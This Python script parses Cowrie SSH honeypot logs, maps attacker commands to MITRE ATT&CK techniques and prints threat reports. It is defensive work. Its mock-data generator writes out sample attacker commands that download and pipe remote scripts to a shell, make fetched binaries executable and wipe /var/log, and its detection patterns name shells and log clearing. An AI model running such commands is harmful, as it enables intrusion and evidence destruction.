#!/usr/bin/env python3
"""
Enterprise SSH Honeypot Log Parser & Threat Intelligence Enrichment Engine
==========================================================================
Author: secbymorchid
Target: Cowrie JSON Telemetry (cowrie.json)
Capabilities:
  - Ingests Cowrie NDJSON logs and parses connection, auth, and command events.
  - Maps attacker behaviors directly to MITRE ATT&CK Enterprise Matrix techniques.
  - Performs Threat Intelligence enrichment (Geolocation & IP Reputation).
  - Generates comprehensive threat summaries, IoC lists, and exportable metrics.
  - Supports a built-in mock telemetry generator for offline testing and demos.
"""

import argparse
import json
import logging
import os
import sys
from collections import Counter
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

# Setup Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("CowrieThreatIntel")

# ==============================================================================
# MITRE ATT&CK Mapping Knowledge Base
# ==============================================================================
MITRE_ATTACK_MAPPINGS = {
    "login_failed": {
        "id": "T1110.001",
        "tactic": "Credential Access",
        "technique": "Brute Force: Password Guessing",
    },
    "login_success": {
        "id": "T1078",
        "tactic": "Defense Evasion / Persistence",
        "technique": "Valid Accounts",
    },
    "file_download": {
        "id": "T1105",
        "tactic": "Command and Control",
        "technique": "Ingress Tool Transfer",
    },
}

COMMAND_SIGNATURES = [
    # Discovery
    (r"uname|cat /etc/issue|lsb_release", "T1082", "Discovery", "System Information Discovery"),
    (r"cat /proc/cpuinfo|lscpu", "T1082", "Discovery", "System Information Discovery"),
    (r"whoami|id|w|who", "T1033", "Discovery", "System Owner/User Discovery"),
    (r"ifconfig|ip addr|ip a|netstat|ss", "T1016", "Discovery", "System Network Configuration Discovery"),
    (r"ps aux|ps -ef|top", "T1057", "Discovery", "Process Discovery"),
    (r"ls -la|find /|dir", "T1083", "Discovery", "File and Directory Discovery"),
    # Execution & Tool Transfer
    (r"curl |wget |tftp |ftp ", "T1105", "Command and Control", "Ingress Tool Transfer"),
    (r"chmod \+x|chmod 777", "T1222.002", "Defense Evasion", "File and Directory Permissions Modification"),
    (r"nohup |&|python|perl|bash -i", "T1059.004", "Execution", "Command and Scripting Interpreter: Unix Shell"),
    # Defense Evasion / Anti-Forensics
    (r"history -c|rm -rf /var/log|unset HISTFILE", "T1070.004", "Defense Evasion", "File Deletion / Indicator Removal"),
    # Persistence
    (r"crontab -e|/etc/cron|authorized_keys", "T1053.003", "Persistence", "Scheduled Task/Job: Cron"),
]


class ThreatTelemetryParser:
    """Parses Cowrie JSON logs and generates structured Threat Intelligence metrics."""

    def __init__(self, geoip_db_path: Optional[str] = None):
        self.geoip_db_path = geoip_db_path
        self.geoip_reader = None

        if geoip_db_path and os.path.exists(geoip_db_path):
            try:
                import geoip2.database
                self.geoip_reader = geoip2.database.Reader(geoip_db_path)
                logger.info(f"Loaded MaxMind GeoIP2 database from {geoip_db_path}")
            except Exception as e:
                logger.warning(f"Failed to load GeoIP database: {e}")

        # Metrics Accumulators
        self.total_sessions = 0
        self.total_events = 0
        self.auth_failed = 0
        self.auth_success = 0
        self.unique_ips: Counter = Counter()
        self.usernames: Counter = Counter()
        self.passwords: Counter = Counter()
        self.credentials: Counter = Counter()
        self.commands: Counter = Counter()
        self.downloads: List[Dict[str, Any]] = []
        self.mitre_techniques: Counter = Counter()
        self.ip_geo_cache: Dict[str, Dict[str, str]] = {}

    def resolve_geoip(self, ip_address: str) -> Dict[str, str]:
        """Resolves IP country and city via GeoIP2 or returns default."""
        if ip_address in self.ip_geo_cache:
            return self.ip_geo_cache[ip_address]

        geo_info = {"country": "Unknown", "country_code": "XX", "city": "Unknown"}
        if self.geoip_reader:
            try:
                response = self.geoip_reader.city(ip_address)
                geo_info["country"] = response.country.name or "Unknown"
                geo_info["country_code"] = response.country.iso_code or "XX"
                geo_info["city"] = response.city.name or "Unknown"
            except Exception:
                pass

        self.ip_geo_cache[ip_address] = geo_info
        return geo_info

    def tag_mitre_command(self, command_str: str):
        """Matches a shell command against known attacker TTP signatures."""
        import re
        matched = False
        for pattern, tech_id, tactic, tech_name in COMMAND_SIGNATURES:
            if re.search(pattern, command_str, re.IGNORECASE):
                key = f"{tech_id} - {tech_name} ({tactic})"
                self.mitre_techniques[key] += 1
                matched = True

        if not matched:
            key = "T1059.004 - Command and Scripting Interpreter: Unix Shell (Execution)"
            self.mitre_techniques[key] += 1

    def process_file(self, log_filepath: str):
        """Processes an NDJSON log file from Cowrie."""
        if not os.path.exists(log_filepath):
            logger.error(f"Log file not found: {log_filepath}")
            sys.exit(1)

        logger.info(f"Ingesting honeypot telemetry from: {log_filepath}")
        line_count = 0

        with open(log_filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    event = json.loads(line)
                    self.process_event(event)
                    line_count += 1
                except json.JSONDecodeError:
                    continue

        self.total_events = line_count
        logger.info(f"Processed {line_count} events successfully.")

    def process_event(self, event: Dict[str, Any]):
        """Parses a single Cowrie JSON event dictionary."""
        event_id = event.get("eventid", "")
        src_ip = event.get("src_ip", "")

        if src_ip:
            self.unique_ips[src_ip] += 1

        if event_id == "cowrie.session.connect":
            self.total_sessions += 1

        elif event_id == "cowrie.login.failed":
            self.auth_failed += 1
            user = event.get("username", "<empty>")
            pwd = event.get("password", "<empty>")
            self.usernames[user] += 1
            self.passwords[pwd] += 1
            self.credentials[f"{user}:{pwd}"] += 1
            self.mitre_techniques["T1110.001 - Brute Force: Password Guessing (Credential Access)"] += 1

        elif event_id == "cowrie.login.success":
            self.auth_success += 1
            user = event.get("username", "<empty>")
            pwd = event.get("password", "<empty>")
            self.usernames[user] += 1
            self.passwords[pwd] += 1
            self.credentials[f"{user}:{pwd}"] += 1
            self.mitre_techniques["T1078 - Valid Accounts (Defense Evasion / Persistence)"] += 1

        elif event_id == "cowrie.command.input":
            cmd = event.get("input", "").strip()
            if cmd:
                self.commands[cmd] += 1
                self.tag_mitre_command(cmd)

        elif event_id == "cowrie.session.file_download":
            url = event.get("url", "")
            sha256 = event.get("shasum", "")
            outfile = event.get("outfile", "")
            self.downloads.append({
                "src_ip": src_ip,
                "url": url,
                "sha256": sha256,
                "outfile": outfile,
                "timestamp": event.get("timestamp", ""),
            })
            self.mitre_techniques["T1105 - Ingress Tool Transfer (Command and Control)"] += 1

    def build_summary_report(self) -> Dict[str, Any]:
        """Constructs an executive JSON-compatible summary of findings."""
        top_ips_detailed = []
        for ip, count in self.unique_ips.most_common(10):
            geo = self.resolve_geoip(ip)
            top_ips_detailed.append({
                "ip": ip,
                "attacks": count,
                "country": geo["country"],
                "city": geo["city"],
            })

        return {
            "metadata": {
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "framework": "Enterprise Threat Intelligence & MITRE ATT&CK",
                "total_events_parsed": self.total_events,
                "unique_attacking_ips": len(self.unique_ips),
                "total_sessions": self.total_sessions,
            },
            "authentication_metrics": {
                "failed_attempts": self.auth_failed,
                "successful_breaches": self.auth_success,
                "top_usernames": dict(self.usernames.most_common(10)),
                "top_passwords": dict(self.passwords.most_common(10)),
                "top_credential_pairs": dict(self.credentials.most_common(10)),
            },
            "top_attackers": top_ips_detailed,
            "top_commands_executed": dict(self.commands.most_common(10)),
            "mitre_attack_matrix": dict(self.mitre_techniques.most_common()),
            "captured_payloads_count": len(self.downloads),
        }

    def print_cli_dashboard(self):
        """Displays a clean, executive terminal dashboard."""
        summary = self.build_summary_report()
        meta = summary["metadata"]
        auth = summary["authentication_metrics"]

        print("\n" + "=" * 70)
        print("    ENTERPRISE SSH HONEYPOT - THREAT INTELLIGENCE REPORT")
        print("=" * 70)
        print(f" Generated At:          {meta['generated_at']}")
        print(f" Total Log Events:      {meta['total_events_parsed']:,}")
        print(f" Unique Attacking IPs:  {meta['unique_attacking_ips']:,}")
        print(f" Brute-Force Attempts:  {auth['failed_attempts']:,}")
        print(f" Successful Breaches:   {auth['successful_breaches']:,}")
        print(f" Commands Intercepted:  {sum(self.commands.values()):,}")
        print("-" * 70)

        print("\n[!] Top 5 Attacker IP Origins:")
        print(f"    {'IP Address':<18} {'Attempts':<10} {'Country':<15} {'City'}")
        print("    " + "-" * 55)
        for item in summary["top_attackers"][:5]:
            print(f"    {item['ip']:<18} {item['attacks']:<10} {item['country']:<15} {item['city']}")

        print("\n[!] Top 5 Targeted Credentials (Username:Password):")
        for cred, count in list(auth["top_credential_pairs"].items())[:5]:
            print(f"    - {cred:<25} ({count:,} attempts)")

        print("\n[!] Top 5 Attacker Shell Commands:")
        for cmd, count in list(summary["top_commands_executed"].items())[:5]:
            print(f"    - `{cmd}` ({count:,} hits)")

        print("\n[!] MITRE ATT&CK® Techniques Mapped:")
        for tech, count in list(summary["mitre_attack_matrix"].items())[:6]:
            print(f"    - [{count:>4}x] {tech}")
        print("=" * 70 + "\n")


def generate_mock_telemetry(filepath: str, count: int = 50):
    """Generates realistic synthetic Cowrie events for validation without live exposure."""
    import random

    sample_ips = [
        "194.26.29.112", "185.156.73.45", "45.148.10.15", "103.151.125.8",
        "198.199.95.21", "91.240.118.234", "180.101.88.243", "79.137.202.19"
    ]
    sample_users = ["root", "admin", "ubuntu", "user", "test", "postgres", "support"]
    sample_passwords = ["123456", "password", "admin", "root", "1234", "toor", "qwerty"]
    sample_commands = [
        "uname -a", "cat /proc/cpuinfo", "id", "whoami",
        "wget http://194.26.29.112/bins/arm7 -O /tmp/.arm && chmod +x /tmp/.arm",
        "curl -s http://185.156.73.45/init.sh | sh",
        "ps aux", "cat /etc/issue", "rm -rf /var/log/*"
    ]

    os.makedirs(os.path.dirname(os.path.abspath(filepath)), exist_ok=True)
    logger.info(f"Generating {count} mock Cowrie events into {filepath}...")

    with open(filepath, "w", encoding="utf-8") as f:
        for _ in range(count):
            ip = random.choice(sample_ips)
            ts = datetime.now(timezone.utc).isoformat()
            roll = random.random()

            if roll < 0.65:
                # Login Failed
                event = {
                    "eventid": "cowrie.login.failed",
                    "timestamp": ts,
                    "src_ip": ip,
                    "src_port": random.randint(30000, 65000),
                    "username": random.choice(sample_users),
                    "password": random.choice(sample_passwords),
                    "session": f"sess_{random.randint(1000, 9999)}",
                }
            elif roll < 0.85:
                # Login Success & Command
                event = {
                    "eventid": "cowrie.login.success",
                    "timestamp": ts,
                    "src_ip": ip,
                    "src_port": random.randint(30000, 65000),
                    "username": "root",
                    "password": random.choice(["root", "123456", "admin"]),
                    "session": f"sess_{random.randint(1000, 9999)}",
                }
                f.write(json.dumps(event) + "\n")
                event = {
                    "eventid": "cowrie.command.input",
                    "timestamp": ts,
                    "src_ip": ip,
                    "input": random.choice(sample_commands),
                    "session": event["session"],
                }
            else:
                # Connect / Disconnect
                event = {
                    "eventid": "cowrie.session.connect",
                    "timestamp": ts,
                    "src_ip": ip,
                    "src_port": random.randint(30000, 65000),
                    "session": f"sess_{random.randint(1000, 9999)}",
                }

            f.write(json.dumps(event) + "\n")

    logger.info("Mock telemetry generated successfully.")


def main():
    parser = argparse.ArgumentParser(
        description="Enterprise Cowrie Threat Intelligence Log Parser & MITRE ATT&CK Mapper"
    )
    parser.add_argument(
        "--input", "-i",
        default="data/logs/cowrie.json",
        help="Path to cowrie.json log file (Default: data/logs/cowrie.json)"
    )
    parser.add_argument(
        "--output", "-o",
        default="data/threat_intelligence_report.json",
        help="Path to export the structured JSON report"
    )
    parser.add_argument(
        "--geoip", "-g",
        default=None,
        help="Path to GeoLite2-City.mmdb database file"
    )
    parser.add_argument(
        "--generate-sample",
        action="store_true",
        help="Generate synthetic mock telemetry for quick demonstration"
    )

    args = parser.parse_args()

    if args.generate_sample:
        generate_mock_telemetry(args.input, count=100)

    threat_engine = ThreatTelemetryParser(geoip_db_path=args.geoip)
    threat_engine.process_file(args.input)
    threat_engine.print_cli_dashboard()

    # Export report
    summary = threat_engine.build_summary_report()
    os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)
    logger.info(f"Exported threat intelligence metrics to: {args.output}")


if __name__ == "__main__":
    main()
